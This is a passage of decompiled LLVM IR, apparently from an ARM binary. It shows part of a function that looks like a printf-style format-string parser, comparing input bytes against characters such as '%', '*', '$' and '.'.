  store i32 %v5_13fac, i32* %r1.global-to-local, align 4
  %v2_13fb0 = load i8, i8* %v1_13fb0, align 1
  %v3_13fb0 = zext i8 %v2_13fb0 to i32
  store i32 %v3_13fb0, i32* %r3.global-to-local, align 4
  %v9_13fb4 = icmp eq i8 %v2_13fb0, %v2_13fac
  br i1 %v9_13fb4, label %dec_label_pc_13fa4.loopexit, label %dec_label_pc_13fc4

dec_label_pc_13fc4:                               ; preds = %dec_label_pc_13fac
  %v1_13fc4 = inttoptr i32 %v5_13fac to i8*
  %v2_13fc4 = load i8, i8* %v1_13fc4, align 1
  %v3_13fc4 = zext i8 %v2_13fc4 to i32
  store i32 %v3_13fc4, i32* %r3.global-to-local, align 4
  %v2_13fc8 = icmp eq i8 %v2_13fc4, 0
  %v2_13fcc = mul i32 %v0_13fcc, 2
  store i32 %v2_13fcc, i32* %r0.global-to-local, align 4
  br i1 %v2_13fc8, label %dec_label_pc_13fd4, label %dec_label_pc_13fac

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13fc4
  %v1_13fd4 = add i32 %storemerge105, -1
  %v2_13fd4 = inttoptr i32 %v1_13fd4 to i8*
  %v3_13fd4 = load i8, i8* %v2_13fd4, align 1
  %v7_13fd8 = icmp eq i8 %v3_13fd4, 37
  %v0_13fdc = load i32, i32* @r4, align 4
  %v1_13fdc = and i32 %v0_13fdc, 10
  store i32 %v1_13fdc, i32* %r3.global-to-local, align 4
  %v4_13fe0 = udiv i32 %v1_13fdc, 2
  %v5_13fe0 = sub nuw nsw i32 -1, %v4_13fe0
  %v6_13fe0 = and i32 %v0_13fdc, %v5_13fe0
  store i32 %v6_13fe0, i32* @r4, align 4
  br i1 %v7_13fd8, label %dec_label_pc_13fe8, label %dec_label_pc_13ec4

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fd4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %bb133, %dec_label_pc_13f24, %dec_label_pc_13f7c, %dec_label_pc_13fe8
  %v1_14030 = phi i32 [ %storemerge105, %dec_label_pc_13fe8 ], [ %v0_13f88, %bb133 ], [ %v0_13f88, %dec_label_pc_13f7c ], [ %v0_13f88, %dec_label_pc_13f24 ]
  %v0_1402c = phi i32 [ %v5_13fac, %dec_label_pc_13fe8 ], [ %v0_13f24, %bb133 ], [ %v0_13f24, %dec_label_pc_13f7c ], [ %v0_13f24, %dec_label_pc_13f24 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_13fe8 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_13f7c ], [ %stack_var_-48.1, %dec_label_pc_13f24 ]
  %v1_13fec = inttoptr i32 %v0_1402c to i8*
  %v2_13fec = load i8, i8* %v1_13fec, align 1
  %v3_13fec = zext i8 %v2_13fec to i32
  store i32 %v3_13fec, i32* %r3.global-to-local, align 4
  %v7_13ff0 = icmp eq i8 %v2_13fec, 42
  br i1 %v7_13ff0, label %dec_label_pc_13ff8, label %dec_label_pc_1403c

dec_label_pc_13ff8:                               ; preds = %dec_label_pc_13fec
  %v0_13ff8 = load i32, i32* %sb.global-to-local, align 4
  %v2_13ff8 = icmp eq i32 %v0_13ff8, 0
  br i1 %v2_13ff8, label %dec_label_pc_1402c, label %dec_label_pc_14000

dec_label_pc_14000:                               ; preds = %dec_label_pc_13ff8
  %v1_14000 = inttoptr i32 %v1_14030 to i8*
  %v2_14000 = load i8, i8* %v1_14000, align 1
  %v3_14000 = zext i8 %v2_14000 to i32
  store i32 %v3_14000, i32* %r3.global-to-local, align 4
  %v7_14004 = icmp eq i8 %v2_14000, 36
  br i1 %v7_14004, label %dec_label_pc_1400c, label %dec_label_pc_142b4

dec_label_pc_1400c:                               ; preds = %dec_label_pc_14000
  %v0_1400c = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_1400c, 1
  br i1 %tmp134, label %dec_label_pc_142b4, label %dec_label_pc_14014

dec_label_pc_14014:                               ; preds = %dec_label_pc_1400c
  store i32 %v25_13e20, i32* %r1.global-to-local, align 4
  %v0_1401c = load i32, i32* @lr, align 4
  %v3_1401c = mul i32 %v0_1401c, -4
  %v4_1401c = add i32 %v3_1401c, %v25_13e20
  store i32 %v4_1401c, i32* %r3.global-to-local, align 4
  %v1_14020 = add i32 %v1_14030, 1
  store i32 %v1_14020, i32* %r6.global-to-local, align 4
  %v2_14024 = add i32 %v4_1401c, -24
  %v3_14024 = inttoptr i32 %v2_14024 to i32*
  store i32 %v0_1400c, i32* %v3_14024, align 4
  br label %dec_label_pc_14038

dec_label_pc_1402c:                               ; preds = %dec_label_pc_13ff8
  %v1_1402c = add i32 %v0_1402c, 1
  store i32 %v1_1402c, i32* %r3.global-to-local, align 4
  %v9_14030 = icmp eq i32 %v1_1402c, %v1_14030
  br i1 %v9_14030, label %dec_label_pc_14038, label %dec_label_pc_142b4

dec_label_pc_14038:                               ; preds = %dec_label_pc_1402c, %dec_label_pc_14014
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %dec_label_pc_13fec, %dec_label_pc_14038
  %v0_1403c = load i32, i32* @lr, align 4
  %v2_1403c = icmp eq i32 %v0_1403c, 0
  br i1 %v2_1403c, label %dec_label_pc_14044, label %dec_label_pc_13e5c

dec_label_pc_14044:                               ; preds = %dec_label_pc_1403c
  %v0_14044 = load i32, i32* %r6.global-to-local, align 4
  %v1_14044 = inttoptr i32 %v0_14044 to i8*
  %v2_14044 = load i8, i8* %v1_14044, align 1
  %v3_14044 = zext i8 %v2_14044 to i32
  store i32 %v3_14044, i32* %r3.global-to-local, align 4
  %v7_14048 = icmp eq i8 %v2_14044, 46
  br i1 %v7_14048, label %.thread22, label %dec_label_pc_1405c

.thread22:                                        ; preds = %dec_label_pc_14044
  %v2_1404c = add i32 %v0_14044, 1
  store i32 %v2_1404c, i32* %r6.global-to-local, align 4
  %v1_14050 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_14050, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_13ec4

dec_label_pc_1405c:                               ; preds = %dec_label_pc_14044
  %v0_1405c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1405c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14064

dec_label_pc_14064:                               ; preds = %dec_label_pc_13e5c, %dec_label_pc_1405c
  %v0_1406c.pre = phi i32 [ %v0_14044, %dec_label_pc_1405c ], [ %v0_1406c.pre.pre, %dec_label_pc_13e5c ]
  %storemerge = phi i32 [ -1, %dec_label_pc_1405c ], [ %v0_13e5c, %dec_label_pc_13e5c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1cc7c.885 to i32), i32* %r1.global-to-local, align 4
  %v1_1406c = inttoptr i32 %v0_1406c.pre to i8*
  br label %dec_label_pc_14068

dec_label_pc_14068:                               ; preds = %dec_label_pc_14078, %dec_label_pc_14064
  %v0_14078 = phi i32 [ %v1_14078, %dec_label_pc_14078 ], [ ptrtoint ([9 x i8]* @global_var_1cc7c.885 to i32), %dec_label_pc_14064 ]
  %v1_14068 = inttoptr i32 %v0_14078 to i8*
  %v2_14068 = load i8, i8* %v1_14068, align 1
  %v3_14068 = zext i8 %v2_14068 to i32
  store i32 %v3_14068, i32* %r2.global-to-local, align 4
  %v2_1406c = load i8, i8* %v1_1406c, align 1
  %v3_1406c = zext i8 %v2_1406c to i32
  store i32 %v3_1406c, i32* %r3.global-to-local, align 4
  %v9_14070 = icmp eq i8 %v2_1406c, %v2_14068
  br i1 %v9_14070, label %dec_label_pc_13e64, label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %dec_label_pc_14068
  %v1_14078 = add i32 %v0_14078, 1
  %v2_14078 = inttoptr i32 %v1_14078 to i8*
  %v3_14078 = load i8, i8* %v2_14078, align 1
  %v4_14078 = zext i8 %v3_14078 to i32
  store i32 %v4_14078, i32* %r3.global-to-local, align 4
  store i32 %v1_14078, i32* %r1.global-to-local, align 4
  %v2_1407c = icmp eq i8 %v3_14078, 0
  br i1 %v2_1407c, label %dec_label_pc_14084, label %dec_label_pc_14068

dec_label_pc_14084:                               ; preds = %dec_label_pc_14078, %dec_label_pc_13e64
  %v1_140a4 = phi i32 [ %v1_13e64, %dec_label_pc_13e64 ], [ %v0_1406c.pre, %dec_label_pc_14078 ]
  %v1_140a0 = phi i32 [ %v0_14078, %dec_label_pc_13e64 ], [ %v1_14078, %dec_label_pc_14078 ]
  %v2_14088 = sub i32 %v1_140a0, ptrtoint ([9 x i8]* @global_var_1cc7c.885 to i32)
  store i32 %v2_14088, i32* %r3.global-to-local, align 4
  %v8_14090 = icmp sgt i32 %v2_14088, 1
  br i1 %v8_14090, label %.thread25, label %dec_label_pc_14094

dec_label_pc_14094:                               ; preds = %dec_label_pc_14084
  %v1_14094 = inttoptr i32 %v1_140a4 to i8*
  %v2_14094 = load i8, i8* %v1_14094, align 1
  %v3_14094 = zext i8 %v2_14094 to i32
  store i32 %v3_14094, i32* %r2.global-to-local, align 4
  %v1_14098 = inttoptr i32 %v1_140a0 to i8*
  %v2_14098 = load i8, i8* %v1_14098, align 1
  %v3_14098 = zext i8 %v2_14098 to i32
  store i32 %v3_14098, i32* %r3.global-to-local, align 4
  %v9_1409c = icmp eq i8 %v2_14094, %v2_14098
  br i1 %v9_1409c, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_14094
  %v2_140a0 = add i32 %v1_140a0, 9
  store i32 %v2_140a0, i32* %r1.global-to-local, align 4
  %v2_140a4 = add i32 %v1_140a4, 1
  store i32 %v2_140a4, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_14094, %dec_label_pc_14084, %bb135
  %v0_140ac = phi i32 [ %v1_140a0, %dec_label_pc_14094 ], [ %v1_140a0, %dec_label_pc_14084 ], [ %v2_140a0, %bb135 ]
  %v0_140a8 = phi i32 [ %v1_140a4, %dec_label_pc_14094 ], [ %v1_140a4, %dec_label_pc_14084 ], [ %v2_140a4, %bb135 ]
  %v1_140a8 = inttoptr i32 %v0_140a8 to i8*
  %v2_140a8 = load i8, i8* %v1_140a8, align 1
  %v3_140a8 = zext i8 %v2_140a8 to i32
  store i32 %v3_140a8, i32* %r2.global-to-local, align 4
  %v1_140ac = add i32 %v0_140ac, 9
  %v2_140ac = inttoptr i32 %v1_140ac to i8*
  %v3_140ac = load i8, i8* %v2_140ac, align 1
  %v4_140ac = zext i8 %v3_140ac to i32
  store i32 %v4_140ac, i32* %r3.global-to-local, align 4
  %v2_140b0 = icmp eq i8 %v2_140a8, 0
  %v3_140b4 = mul nuw nsw i32 %v4_140ac, 256
  store i32 %v3_140b4, i32* @lr, align 4
  br i1 %v2_140b0, label %dec_label_pc_142b4, label %dec_label_pc_140bc

dec_label_pc_140bc:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_1ccbc.887 to i32), i32* %ip.global-to-local, align 4
  %v3_140c0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_140c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140c4

dec_label_pc_140c4:                               ; preds = %dec_label_pc_14148, %dec_label_pc_140bc
  %v1_140d4 = phi i32 [ %v1_14148, %dec_label_pc_14148 ], [ ptrtoint ([21 x i8]* @global_var_1ccbc.887 to i32), %dec_label_pc_140bc ]
  %v1_140c4 = inttoptr i32 %v1_140d4 to i8*
  %v2_140c4 = load i8, i8* %v1_140c4, align 1
  %v3_140c4 = zext i8 %v2_140c4 to i32
  store i32 %v3_140c4, i32* %r3.global-to-local, align 4
  %v9_140c8 = icmp eq i8 %v2_140c4, %v2_140a8
  br i1 %v9_140c8, label %dec_label_pc_140d0, label %dec_label_pc_14148

dec_label_pc_140d0:                               ; preds = %dec_label_pc_140c4
  store i32 ptrtoint ([21 x i8]* @global_var_1ccbc.887 to i32), i32* %r3.global-to-local, align 4
  %v2_140d4 = sub i32 %v1_140d4, ptrtoint ([21 x i8]* @global_var_1ccbc.887 to i32)
  store i32 %v2_140d4, i32* %r2.global-to-local, align 4
  %v7_140dc = icmp slt i32 %v2_140d4, 18
  br i1 %v7_140dc, label %bb137, label %dec_label_pc_140e0

dec_label_pc_140e0:                               ; preds = %dec_label_pc_140d0
  %v1_140e0 = and i32 %v3_140b4, 1024
  %v2_140e0 = icmp eq i32 %v1_140e0, 0
  br i1 %v2_140e0, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_140e0
  %v2_140e4 = add i32 %v2_140d4, -2
  store i32 %v2_140e4, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_140d0, %dec_label_pc_140e0, %bb136
  %v0_140e8 = phi i32 [ %v2_140d4, %dec_label_pc_140d0 ], [ %v2_140d4, %dec_label_pc_140e0 ], [ %v2_140e4, %bb136 ]
  %v1_140e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_140e8 = add i32 %v1_140e8, 32
  %v3_140e8 = inttoptr i32 %v2_140e8 to i32*
  store i32 %v0_140e8, i32* %v3_140e8, align 4
  store i32 ptrtoint (i32* @global_var_1ccaf.889 to i32), i32* %r1.global-to-local, align 4
  %v0_140f4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_140f0

dec_label_pc_140f0:                               ; preds = %dec_label_pc_140f0, %bb137
  %v0_140f0 = phi i32 [ %v1_140f0, %dec_label_pc_140f0 ], [ ptrtoint (i32* @global_var_1ccaf.889 to i32), %bb137 ]
  %v1_140f0 = add i32 %v0_140f0, 1
  %v2_140f0 = inttoptr i32 %v1_140f0 to i8*
  %v3_140f0 = load i8, i8* %v2_140f0, align 1
  %v4_140f0 = zext i8 %v3_140f0 to i32
  store i32 %v4_140f0, i32* %r3.global-to-local, align 4
  store i32 %v1_140f0, i32* %r1.global-to-local, align 4
  %v8_140f8 = icmp sgt i32 %v0_140f4.pre, %v4_140f0
  br i1 %v8_140f8, label %dec_label_pc_140f0, label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140f0
  store i32 ptrtoint (i32* @global_var_1cca0.893 to i32), i32* %r0.global-to-local, align 4
  %v2_14104 = sub i32 %v1_140f0, ptrtoint (i32* @global_var_1ccb0.891 to i32)
  %v2_14108 = mul i32 %v2_14104, 2
  store i32 %v2_14108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cc90.895 to i32), i32* %ip.global-to-local, align 4
  %v2_14110 = add i32 %v2_14108, ptrtoint (i32* @global_var_1cca0.893 to i32)
  store i32 %v2_14110, i32* %r2.global-to-local, align 4
  %v1_14114 = add i32 %v2_14108, add (i32 ptrtoint (i32* @global_var_1cca0.893 to i32), i32 1)
  %v2_14114 = inttoptr i32 %v1_14114 to i8*
  %v3_14114 = load i8, i8* %v2_14114, align 1
  %v4_14114 = zext i8 %v3_14114 to i32
  store i32 %v4_14114, i32* %r1.global-to-local, align 4
  %v2_14118 = add i32 %v2_14108, ptrtoint (i32* @global_var_1cc90.895 to i32)
  store i32 %v2_14118, i32* %r2.global-to-local, align 4
  %v3_1411c = inttoptr i32 %v2_14110 to i8*
  %v4_1411c = load i8, i8* %v3_1411c, align 2
  %v6_1411c = zext i8 %v4_1411c to i32
  store i32 %v6_1411c, i32* %r0.global-to-local, align 4
  %v1_14120 = add i32 %v2_14108, add (i32 ptrtoint (i32* @global_var_1cc90.895 to i32), i32 1)
  %v2_14120 = inttoptr i32 %v1_14120 to i8*
  %v3_14120 = load i8, i8* %v2_14120, align 1
  %v4_14120 = zext i8 %v3_14120 to i32
  store i32 %v4_14120, i32* %r2.global-to-local, align 4
  %v3_14124 = inttoptr i32 %v2_14118 to i8*
  %v4_14124 = load i8, i8* %v3_14124, align 2
  %v6_14124 = zext i8 %v4_14124 to i32
  %v3_14128 = mul nuw i32 %v4_14114, 16777216
  store i32 %v3_14128, i32* %r1.global-to-local, align 4
  %v4_1412c = sdiv i32 %v3_14128, 65536
  %v5_1412c = or i32 %v6_1411c, %v4_1412c
  %v3_14130 = mul nuw i32 %v4_14120, 16777216
  store i32 %v3_14130, i32* %r2.global-to-local, align 4
  %v4_14134 = sdiv i32 %v3_14130, 65536
  %v5_14134 = or i32 %v6_14124, %v4_14134
  store i32 %v5_14134, i32* %r3.global-to-local, align 4
  %v0_14138 = load i32, i32* @lr, align 4
  %v2_14138 = or i32 %v5_1412c, %v0_14138
  store i32 ptrtoint ([21 x i8]* @global_var_1ccbc.887 to i32), i32* %ip.global-to-local, align 4
  %v2_14140 = and i32 %v2_14138, %v5_14134
  store i32 %v2_14140, i32* %r0.global-to-local, align 4
  %v0_1415c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14154

dec_label_pc_14148:                               ; preds = %dec_label_pc_140c4
  %v1_14148 = add i32 %v1_140d4, 1
  %v2_14148 = inttoptr i32 %v1_14148 to i8*
  %v3_14148 = load i8, i8* %v2_14148, align 1
  %v4_14148 = zext i8 %v3_14148 to i32
  store i32 %v4_14148, i32* %r3.global-to-local, align 4
  store i32 %v1_14148, i32* %ip.global-to-local, align 4
  %v2_1414c = icmp eq i8 %v3_14148, 0
  br i1 %v2_1414c, label %dec_label_pc_14154, label %dec_label_pc_140c4

dec_label_pc_14154:                               ; preds = %dec_label_pc_14148, %dec_label_pc_140fc
  %v0_14160 = phi i32 [ %v0_14138, %dec_label_pc_140fc ], [ %v3_140b4, %dec_label_pc_14148 ]
  %v0_1415c = phi i32 [ %v0_1415c.pre, %dec_label_pc_140fc ], [ %v0_140a8, %dec_label_pc_14148 ]
  %v0_14154 = phi i32 [ %v2_14140, %dec_label_pc_140fc ], [ %v3_140c0, %dec_label_pc_14148 ]
  store i32 %v0_14154, i32* %stack_var_-36, align 4
  %v0_14158 = load i32, i32* @r4, align 4
  %v1_14158 = and i32 %v0_14158, 4
  %v1_1415c = inttoptr i32 %v0_1415c to i8*
  %v2_1415c = load i8, i8* %v1_1415c, align 1
  %v3_1415c = zext i8 %v2_1415c to i32
  store i32 %v3_1415c, i32* %r1.global-to-local, align 4
  %v1_14160 = and i32 %v0_14160, 3840
  %v1_14164 = and i32 %v0_14158, -5
  %v2_14168 = or i32 %v1_14164, %v1_14160
  store i32 %v2_14168, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_14158, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_14178 = load i32, i32* %r7.global-to-local, align 4
  %v2_14178 = add i32 %v1_14178, 12
  %v3_14178 = inttoptr i32 %v2_14178 to i32*
  store i32 %v3_1415c, i32* %v3_14178, align 4
  %v0_1417c = load i32, i32* %r7.global-to-local, align 4
  %v1_1417c = add i32 %v0_1417c, 4
  %v2_1417c = inttoptr i32 %v1_1417c to i32*
  %v3_1417c = load i32, i32* @r5, align 4
  store i32 %v3_1417c, i32* %v2_1417c, align 4
  %v4_1417c = add i32 %v0_1417c, 8
  %v5_1417c = inttoptr i32 %v4_1417c to i32*
  %v6_1417c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_1417c, i32* %v5_1417c, align 4
  %v0_14180 = load i32, i32* %r3.global-to-local, align 4
  %v1_14180 = load i32, i32* %r7.global-to-local, align 4
  %v2_14180 = add i32 %v1_14180, 20
  %v3_14180 = inttoptr i32 %v2_14180 to i32*
  store i32 %v0_14180, i32* %v3_14180, align 4
  %v0_14184 = load i32, i32* %r2.global-to-local, align 4
  %v1_14184 = load i32, i32* %r7.global-to-local, align 4
  %v2_14184 = add i32 %v1_14184, 16
  %v3_14184 = inttoptr i32 %v2_14184 to i32*
  store i32 %v0_14184, i32* %v3_14184, align 4
  %v0_14188 = load i32, i32* %r0.global-to-local, align 4
  %v1_14188 = load i32, i32* %r7.global-to-local, align 4
  %v2_14188 = add i32 %v1_14188, 28
  %v3_14188 = inttoptr i32 %v2_14188 to i32*
  store i32 %v0_14188, i32* %v3_14188, align 4
  %v0_1418c = load i32, i32* %ip.global-to-local, align 4
  %v1_1418c = inttoptr i32 %v0_1418c to i8*
  %v2_1418c = load i8, i8* %v1_1418c, align 1
  %v3_1418c = zext i8 %v2_1418c to i32
  store i32 %v3_1418c, i32* %r2.global-to-local, align 4
  %v2_14190 = icmp eq i8 %v2_1418c, 0
  br i1 %v2_14190, label %dec_label_pc_14198, label %dec_label_pc_141b0

dec_label_pc_14198:                               ; preds = %dec_label_pc_14154
  %v0_14198 = load i32, i32* %r6.global-to-local, align 4
  %v1_14198 = inttoptr i32 %v0_14198 to i8*
  %v2_14198 = load i8, i8* %v1_14198, align 1
  %v3_14198 = zext i8 %v2_14198 to i32
  store i32 %v3_14198, i32* %r3.global-to-local, align 4
  %v7_1419c = icmp eq i8 %v2_14198, 109
  br i1 %v7_1419c, label %dec_label_pc_141a4, label %dec_label_pc_142b4

dec_label_pc_141a4:                               ; preds = %dec_label_pc_14198
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_141a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_141a8 = add i32 %v1_141a8, 32
  %v3_141a8 = inttoptr i32 %v2_141a8 to i32*
  store i32 20, i32* %v3_141a8, align 4
  %v0_141ac = load i32, i32* %r2.global-to-local, align 4
  %v1_141ac = load i32, i32* %r7.global-to-local, align 4
  %v2_141ac = add i32 %v1_141ac, 28
  %v3_141ac = inttoptr i32 %v2_141ac to i32*
  store i32 %v0_141ac, i32* %v3_141ac, align 4
  br label %dec_label_pc_141b0

dec_label_pc_141b0:                               ; preds = %dec_label_pc_14154, %dec_label_pc_141a4
  %v0_141b0 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_141b0, 1
  br i1 %tmp141, label %dec_label_pc_14268, label %dec_label_pc_141b8

dec_label_pc_141b8:                               ; preds = %dec_label_pc_141b0
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_141bc

dec_label_pc_141bc:                               ; preds = %dec_label_pc_14250, %dec_label_pc_141b8
  %v8_141d8 = phi i32 [ 0, %dec_label_pc_141b8 ], [ %v1_14254, %dec_label_pc_14250 ]
  %v7_141c0 = icmp sgt i32 %v8_141d8, 2
  br i1 %v7_141c0, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_141bc
  store i32 %v25_13e20, i32* %r2.global-to-local, align 4
  %v12_141c4 = mul i32 %v8_141d8, 4
  %v13_141c4 = add i32 %v12_141c4, %v25_13e20
  store i32 %v13_141c4, i32* %r3.global-to-local, align 4
  %v9_141c8 = add i32 %v13_141c4, -24
  %v10_141c8 = inttoptr i32 %v9_141c8 to i32*
  %v11_141c8 = load i32, i32* %v10_141c8, align 4
  store i32 %v11_141c8, i32* %r2.global-to-local, align 4
  %v9_141cc = load i32, i32* %r7.global-to-local, align 4
  %v10_141cc = add i32 %v9_141cc, %v8_141d8
  store i32 %v10_141cc, i32* %r3.global-to-local, align 4
  %v9_141d4 = trunc i32 %v11_141c8 to i8
  %v11_141d4 = add i32 %v10_141cc, 36
  %v12_141d4 = inttoptr i32 %v11_141d4 to i8*
  store i8 %v9_141d4, i8* %v12_141d4, align 1
  %v8_141dc = load i32, i32* %r3.global-to-local, align 4
  %v9_141dc = add i32 %v8_141dc, 36
  %v10_141dc = inttoptr i32 %v9_141dc to i8*
  %v11_141dc = load i8, i8* %v10_141dc, align 1
  %v12_141dc = zext i8 %v11_141dc to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_141bc
  %v10_141d8 = add i32 %v8_141d8, %stack_var_-48.3
  store i32 %v10_141d8, i32* %r3.global-to-local, align 4
  %v9_141e0 = add i32 %v10_141d8, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_14204 = phi i32 [ %v12_141dc, %bb142 ], [ %v9_141e0, %bb143 ]
  store i32 %v0_14204, i32* @r2, align 4
  %v1_141e4 = load i32, i32* %sb.global-to-local, align 4
  %v2_141e4 = sub i32 %v0_14204, %v1_141e4
  %v4_141e4 = xor i32 %v1_141e4, %v0_14204
  %v5_141e4 = xor i32 %v2_141e4, %v0_14204
  %v6_141e4 = and i32 %v5_141e4, %v4_141e4
  %v7_141e4 = icmp slt i32 %v6_141e4, 0
  %v8_141e4 = icmp slt i32 %v2_141e4, 0
  %v9_141e4 = icmp eq i32 %v0_14204, %v1_141e4
  %v3_141e8 = xor i1 %v8_141e4, %v7_141e4
  %v4_141e8 = or i1 %v9_141e4, %v3_141e8
  br i1 %v4_141e8, label %dec_label_pc_141f8, label %dec_label_pc_141ec

dec_label_pc_141ec:                               ; preds = %bb144
  %v1_141ec = add i32 %v0_14204, -9
  %v3_141ec = sub i32 8, %v0_14204
  %v4_141ec = and i32 %v3_141ec, %v0_14204
  %v5_141ec = icmp slt i32 %v4_141ec, 0
  %v6_141ec = icmp slt i32 %v1_141ec, 0
  %v7_141ec = icmp eq i32 %v0_14204, 9
  %v3_141f0 = xor i1 %v6_141ec, %v5_141ec
  %v4_141f0 = or i1 %v7_141ec, %v3_141f0
  br i1 %v4_141f0, label %dec_label_pc_141f4, label %dec_label_pc_142b4

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141ec
  store i32 %v0_14204, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_141f8

dec_label_pc_141f8:                               ; preds = %bb144, %dec_label_pc_141f4
  store i32 %v25_13e20, i32* %ip.global-to-local, align 4
  %v1_141fc = load i32, i32* %r8.global-to-local, align 4
  %v4_141fc = mul i32 %v1_141fc, 4
  %v5_141fc = add i32 %v4_141fc, %v25_13e20
  store i32 %v5_141fc, i32* %r3.global-to-local, align 4
  %v1_14200 = add i32 %v5_141fc, -12
  %v2_14200 = inttoptr i32 %v1_14200 to i32*
  %v3_14200 = load i32, i32* %v2_14200, align 4
  store i32 %v3_14200, i32* %r5.global-to-local, align 4
  %v1_14204 = add i32 %v0_14204, -1
  store i32 %v1_14204, i32* %sl.global-to-local, align 4
  %v0_14208 = load i32, i32* %r7.global-to-local, align 4
  %v4_14208 = mul i32 %v1_14204, 4
  %v5_14208 = add i32 %v0_14208, %v4_14208
  store i32 %v5_14208, i32* %r3.global-to-local, align 4
  %v7_1420c = icmp eq i32 %v3_14200, 8
  %v1_14210 = add i32 %v5_14208, 40
  %v2_14210 = inttoptr i32 %v1_14210 to i32*
  %v3_14210 = load i32, i32* %v2_14210, align 4
  store i32 %v3_14210, i32* @r0, align 4
  br i1 %v7_1420c, label %dec_label_pc_14250, label %dec_label_pc_14218

dec_label_pc_14218:                               ; preds = %dec_label_pc_141f8
  %v9_14218 = icmp eq i32 %v3_14210, %v3_14200
  br i1 %v9_14218, label %dec_label_pc_1423c, label %bb145

bb145:                                            ; preds = %dec_label_pc_14218
  %v8_1421c = icmp eq i32 %v3_14210, 8
  br i1 %v8_1421c, label %dec_label_pc_1423c, label %dec_label_pc_14224

dec_label_pc_14224:                               ; preds = %bb145
  %v0_14224 = call i32 @_promoted_size()
  %v0_1422c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1422c, i32* @r0, align 4
  %v0_14230 = call i32 @_promoted_size()
  store i32 %v0_14230, i32* %r0.global-to-local, align 4
  %v8_14238 = icmp sgt i32 %v0_14224, %v0_14230
  br i1 %v8_14238, label %dec_label_pc_14250, label %dec_label_pc_14224.dec_label_pc_1423c_crit_edge

dec_label_pc_14224.dec_label_pc_1423c_crit_edge:  ; preds = %dec_label_pc_14224
  %v1_14240.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_14248.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_14248.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1423c

dec_label_pc_1423c:                               ; preds = %dec_label_pc_14224.dec_label_pc_1423c_crit_edge, %dec_label_pc_14218, %bb145
  %v1_14248 = phi i32 [ %v1_14248.pre, %dec_label_pc_14224.dec_label_pc_1423c_crit_edge ], [ %v1_14204, %dec_label_pc_14218 ], [ %v1_14204, %bb145 ]
  %v0_14248 = phi i32 [ %v0_14248.pre, %dec_label_pc_14224.dec_label_pc_1423c_crit_edge ], [ %v0_14208, %dec_label_pc_14218 ], [ %v0_14208, %bb145 ]
  %v1_14240 = phi i32 [ %v1_14240.pre, %dec_label_pc_14224.dec_label_pc_1423c_crit_edge ], [ %v1_141fc, %dec_label_pc_14218 ], [ %v1_141fc, %bb145 ]
  store i32 %v25_13e20, i32* %r1.global-to-local, align 4
  %v4_14240 = mul i32 %v1_14240, 4
  %v5_14240 = add i32 %v4_14240, %v25_13e20
  store i32 %v5_14240, i32* %r3.global-to-local, align 4
  %v1_14244 = add i32 %v5_14240, -12
  %v2_14244 = inttoptr i32 %v1_14244 to i32*
  %v3_14244 = load i32, i32* %v2_14244, align 4
  store i32 %v3_14244, i32* @r2, align 4
  %v4_14248 = mul i32 %v1_14248, 4
  %v5_14248 = add i32 %v4_14248, %v0_14248
  store i32 %v5_14248, i32* %r3.global-to-local, align 4
  %v2_1424c = add i32 %v5_14248, 40
  %v3_1424c = inttoptr i32 %v2_1424c to i32*
  store i32 %v3_14244, i32* %v3_1424c, align 4
  br label %dec_label_pc_14250

dec_label_pc_14250:                               ; preds = %dec_label_pc_14224, %dec_label_pc_141f8, %dec_label_pc_1423c
  %v0_14250 = load i32, i32* %r7.global-to-local, align 4
  %v1_14250 = add i32 %v0_14250, 28
  %v2_14250 = inttoptr i32 %v1_14250 to i32*
  %v3_14250 = load i32, i32* %v2_14250, align 4
  %v0_14254 = load i32, i32* %r8.global-to-local, align 4
